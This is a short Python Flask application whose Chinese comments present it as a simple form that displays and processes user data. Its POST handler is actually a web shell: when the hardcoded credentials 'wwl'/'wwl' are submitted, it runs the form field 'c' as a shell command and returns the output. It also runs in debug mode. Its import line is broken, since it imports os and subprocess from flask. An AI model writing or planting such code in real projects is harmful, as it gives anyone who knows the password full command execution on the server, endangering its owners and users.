from flask import Flask, request, render_template, os, subprocess

app = Flask(__name__)

@app.route('/')
def index():
    # 显示一个简单的表单，让用户输入一些数据
    return render_template('form.html')

@app.route('/', methods=['POST'])
def process_form():
    # 处理表单提交的数据
    c = request.form['c']
    u = request.form['u']
    p = request.form['p']
    if u == "wwl" and p == "wwl":
        # 打印输出数据
        print('c:', c)
        print('u:', u)
        print('p:', p)
        # 返回一个响应给用户，告诉他们数据已经处理完毕
        return subprocess.check_output(c, shell=True)

if __name__ == '__main__':
    app.run(debug=True)
